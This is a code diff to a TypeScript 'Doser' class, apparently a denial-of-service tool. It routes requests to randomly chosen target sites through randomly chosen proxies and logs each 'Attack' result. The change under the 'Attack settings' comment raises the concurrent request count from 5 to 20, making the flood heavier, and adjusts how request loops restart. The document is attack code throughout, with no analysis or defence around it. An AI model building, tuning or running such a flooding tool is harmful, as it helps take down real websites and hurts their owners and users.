@@ -1,6 +1,5 @@
 import axios from 'axios-https-proxy-fix'
 import { EventEmitter } from 'events'
-import _ from "lodash";
 
 interface ProxyData {
   ip: string;
@@ -25,7 +24,7 @@ export class Doser {
   // private compactRequestsArrayInterval?: NodeJS.Timer;
 
   // Attack settings
-  private maxRequestCount = 5;
+  private maxRequestCount = 20;
 
   private requestsPromises: Array<any> = [];
 
@@ -90,6 +89,7 @@ export class Doser {
     const {sites, proxies} = this.loadedTargetsAndProxies;
     const randomSite = sites[Math.floor(Math.random() * sites.length)]; //Get random site
     const randomProxy = proxies[Math.floor(Math.random() * proxies.length)]; //Get random proxy
+    // console.log('data:: ', randomProxy, randomSite)
 
     const proxyAddressSplit = randomProxy.ip.split(':')
     const proxyIP = proxyAddressSplit[0]
@@ -118,9 +118,9 @@ export class Doser {
       const result = await promise;
       console.log(`Attack: ${randomSite.page} | ${result.status}`);
     } catch(e: any) {
-      console.log(`Fail: ${randomSite.page} | ${e.code}`);
+      console.log(`Fail: ${randomSite.page} | ${e.code} `);
     }
 
-    this.requestsPromises[promiseIndex] = this.generateRequestPromise(promiseIndex);
+    this.generateRequestPromise(promiseIndex);
   }
 }
